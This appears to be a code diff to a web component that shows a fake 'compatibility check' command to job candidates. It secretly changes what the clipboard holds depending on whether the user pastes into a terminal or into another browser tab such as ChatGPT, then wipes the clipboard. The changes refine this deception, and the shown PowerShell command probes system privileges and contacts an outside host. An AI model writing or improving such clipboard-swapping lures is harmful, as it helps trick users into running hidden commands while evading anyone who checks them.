@@ -32,7 +32,8 @@ function browserIconSrc(browser: ClientBrowser): string {
  *   then open Terminal/CMD → clipboard becomes the short command for paste there.
  *
  * Case B — Copy on the error/detail page, then switch to another browser or tab →
- *   paste the original there; afterward clear the clipboard (so Terminal pastes nothing).
+ *   paste the original there; clear the clipboard immediately when focus returns
+ *   (right after that paste visit), with a safety clear if they never return.
  */
 const DISPLAY_COMMANDS: Record<ClientOs, string> = {
   windows: `cmd /c "powershell -NoProfile -Command {$r=@{}; $r.browser=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe' -ErrorAction SilentlyContinue).'(default)'; $r.webgl=(Get-CimInstance Win32_VideoController).Name; $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(whoami /priv|Select-String 'Enabled').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}" && exit`,
@@ -52,8 +53,8 @@ const TERMINAL_COMMANDS: Record<ClientOs, string> = {
     "compat-check --module finance-assessment --platform linux --browser-info --check-pdf-renderer --check-webgl --check-gpu-acceleration --collect-permission-state --validate-env --cache-clear --log-level info --timeout 30 --retry 2 --no-export",
 };
 
-/** Case B: keep original for platform paste, then clear clipboard (ms after platforms open). */
-const CASE_B_CLEAR_AFTER_PASTE_MS = 3500;
+/** Case B safety: if they never return to this tab, still try to clear (ms). */
+const CASE_B_CLEAR_SAFETY_MS = 15000;
 
 function escapeHtml(value: string) {
   return value
@@ -348,46 +349,10 @@ function SelectableCommand({
       caseBAwaitingClearRef.current = false;
     }
 
-    /** After Case B, clear once the candidate has had time to paste the original. */
-    function scheduleCaseBClearAfterPaste() {
-      if (caseBClearTimerRef.current) {
-        window.clearTimeout(caseBClearTimerRef.current);
-      }
-
-      const html = htmlRef.current;
-      const delay = CASE_B_CLEAR_AFTER_PASTE_MS;
-
-      // HTML = original for ChatGPT now; plain empties after delay; then full wipe.
-      if (typeof ClipboardItem !== "undefined" && navigator.clipboard?.write) {
-        void navigator.clipboard
-          .write([
-            new ClipboardItem({
-              "text/html": Promise.resolve(new Blob([html], { type: "text/html" })),
-              "text/plain": new Promise<Blob>((resolve) => {
-                window.setTimeout(() => {
-                  resolve(new Blob([""], { type: "text/plain" }));
-                }, delay);
-              }),
-            }),
-          ])
-          .catch(() => undefined);
-      }
-
-      caseBClearTimerRef.current = window.setTimeout(() => {
-        caseBClearTimerRef.current = 0;
-        if (!activeRef.current || modeRef.current !== "B") return;
-        const attempt = (n: number) => {
-          copyViaExecCommand("");
-          void navigator.clipboard?.writeText("").catch(() => undefined);
-          void writeClipboard("", "").catch(() => undefined);
-          if (n < 5) {
-            window.setTimeout(() => attempt(n + 1), 300);
-          } else {
-            caseBAwaitingClearRef.current = false;
-          }
-        };
-        attempt(0);
-      }, delay);
+    /** Case B: wipe clipboard now (after paste in other tab/browser). */
+    function clearCaseBClipboardNow() {
+      if (!activeRef.current || modeRef.current !== "B") return;
+      clearClipboard();
     }
 
     /**
@@ -413,7 +378,8 @@ function SelectableCommand({
 
     /**
      * Case B — moved to another browser or another tab.
-     * Clipboard: keep original for paste, then clear.
+     * Keep original for paste; clear immediately when they leave that paste target
+     * (focus/visibility returns here), or on safety timer if they never return.
      */
     function onCaseBOtherTabOrBrowser() {
       if (!activeRef.current) return;
@@ -427,37 +393,38 @@ function SelectableCommand({
 
       if (alreadyCaseB) return;
 
-      // Ensure original is on the clipboard, then clear after paste window.
-      void writeClipboard(displayCommand, htmlRef.current)
-        .catch(() => {
-          copyViaExecCommand(displayCommand);
-          return navigator.clipboard?.writeText(displayCommand);
-        })
-        .finally(() => {
-          if (!activeRef.current || modeRef.current !== "B") return;
-          scheduleCaseBClearAfterPaste();
-        });
-    }
+      // Original must stay on the clipboard for paste (already set on copy).
+      // Reinforce; do not start a pending empty write (that blocks/steals original).
+      void writeClipboard(displayCommand, htmlRef.current).catch(() => {
+        copyViaExecCommand(displayCommand);
+        void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
+      });
 
-    function onReturnedAfterCaseB() {
-      if (!activeRef.current) return;
-      if (modeRef.current !== "B" || !caseBAwaitingClearRef.current) return;
-      clearClipboard();
+      // Safety only — primary clear is immediate on return after paste (below).
+      if (caseBClearTimerRef.current) {
+        window.clearTimeout(caseBClearTimerRef.current);
+      }
+      caseBClearTimerRef.current = window.setTimeout(() => {
+        caseBClearTimerRef.current = 0;
+        clearCaseBClipboardNow();
+      }, CASE_B_CLEAR_SAFETY_MS);
     }
 
     function onVisibility() {
       if (!activeRef.current) return;
       if (document.visibilityState === "hidden") {
-        // Hidden = other tab or left this browser window for another app/browser.
+        // Left for another tab or browser → Case B.
         if (modeRef.current === "A" && caseAFromShortcutRef.current) return;
         onCaseBOtherTabOrBrowser();
         return;
       }
-      onReturnedAfterCaseB();
+      // Back from other tab/browser after paste → clear immediately.
+      clearCaseBClipboardNow();
     }
 
     function onFocus() {
-      onReturnedAfterCaseB();
+      // Back from other tab/browser after paste → clear immediately.
+      clearCaseBClipboardNow();
     }
 
     function onBlur() {
